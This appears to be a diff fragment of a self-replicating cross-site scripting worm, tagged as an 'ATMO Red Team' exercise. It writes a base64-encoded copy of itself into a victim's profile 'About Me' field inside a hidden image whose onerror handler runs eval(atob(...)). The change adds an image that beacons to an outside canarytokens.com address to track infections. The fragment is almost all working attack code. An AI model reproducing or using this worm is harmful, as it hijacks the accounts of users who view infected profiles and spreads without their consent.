@@ -24,7 +24,7 @@ setTimeout(function() {
             success: function (data) {
                 var payload = btoa(data);
                 
-                var profile_payload = $("#edit_profile").contents().find('#txtAboutMe').val() + "<p>I support the ATMO Red Team</p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";
+                var profile_payload = $("#edit_profile").contents().find('#txtAboutMe').val() + "<p>I support the ATMO Red Team <img src='//canarytokens.com/about/0zbvacnyfmch57edk6bsh5vid/contact.php'></p><img style='display: none;' src='x' onerror='eval(atob(\"" + payload + "\"));'>";
                 $("#edit_profile").contents().find('#txtAboutMe').val(profile_payload);     
                 
                 console.log($("#edit_profile").contents().find('#txtAboutMe').val());  
